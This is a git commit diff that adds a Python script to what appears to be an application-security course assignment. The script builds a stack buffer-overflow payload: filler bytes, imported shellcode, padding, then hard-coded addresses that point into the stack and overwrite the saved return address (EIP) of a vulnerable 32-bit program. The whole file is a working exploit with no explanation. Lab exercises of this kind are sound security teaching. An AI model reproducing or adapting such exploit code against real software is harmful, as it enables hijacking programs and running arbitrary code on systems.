410c773c6e39eaed7ba6d2d1fcacb1b736775f2a
aa <aa@aa.com>
2021-02-02 19:01:30 +0800

    Add 1.2.4

--- AppSec/1.2.4.py
+++ AppSec/1.2.4.py
@@ -5,3 +5,20 @@ from shellcode import shellcode
 from struct import pack
 
 # Your code here
+
+# 0xfffed6d8 
+# addr_shell = b'\xAA\xAA\xAA\xAA'
+addr_shell = b'\xd8\xd6\xfe\xff'
+
+# 0xfffed70c
+# addr_EIP = b'\xFF\xFF\xFF\xFF'
+addr_EIP = b'\x0c\xd7\xfe\xff'
+
+print(len(shellcode))
+
+pad = 2048-9
+sys.stdout.buffer.write(b'\xFF'*(pad-len(shellcode)))
+sys.stdout.buffer.write(shellcode)
+sys.stdout.buffer.write(b'\xDD'*9)
+sys.stdout.buffer.write(addr_shell)  # a
+sys.stdout.buffer.write(addr_EIP)  # p
